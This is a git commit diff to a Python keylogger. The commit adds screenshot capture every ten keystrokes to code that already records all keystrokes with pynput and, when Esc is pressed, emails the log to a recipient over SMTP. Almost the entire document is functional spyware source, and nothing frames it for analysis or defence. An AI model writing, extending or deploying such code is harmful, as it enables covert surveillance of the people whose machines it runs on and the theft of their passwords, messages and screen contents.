b5aed0891d5479e2d6494db585665c4a8e0a6e8e
DAS <46620390+wizhardhacker1@users.noreply.github.com>
2023-03-31 22:54:44 -0700

    Update pykeylogger.py

--- pykeylogger.py
+++ pykeylogger.py
@@ -1,9 +1,11 @@
 import pynput.keyboard
 import smtplib
 import subprocess
+import pyautogui
+from pynput.keyboard import Key
 
 # List of required modules
-required_modules = ['pynput', 'smtplib']
+required_modules = ['pynput', 'smtplib', 'pyautogui']
 
 # Check if required modules are installed and install them if necessary
 for module in required_modules:
@@ -20,19 +22,28 @@ smtp_password = 'password'
 from_address = 'username@example.com'
 to_address = 'recipient@example.com'
 
-# Create an empty variable to store the keystrokes
+# Create an empty variable to store the keystrokes and counter for screenshot
 keystrokes = ''
+counter = 0
+
 
 def on_press(key):
-    global keystrokes
+    global keystrokes, counter
     try:
         keystrokes += key.char
     except AttributeError:
         keystrokes += ' [{0}] '.format(key)
+    counter += 1
+    if counter == 10:
+        # Take a screenshot every 10 keystrokes
+        screenshot = pyautogui.screenshot()
+        screenshot.save('screenshot.png')
+        counter = 0
+
 
 def on_release(key):
     global keystrokes
-    if key == pynput.keyboard.Key.esc:
+    if key == Key.esc:
         # Send email when the Esc key is pressed to terminate the program
         message = 'Subject: Keylogger Results\n\n{0}'.format(keystrokes)
         with smtplib.SMTP(smtp_server, smtp_port) as server:
@@ -40,6 +51,7 @@ def on_release(key):
             server.login(smtp_username, smtp_password)
             server.sendmail(from_address, to_address, message)
         return False
+
 
 # Start the keylogger
 with pynput.keyboard.Listener(on_press=on_press, on_release=on_release) as listener:
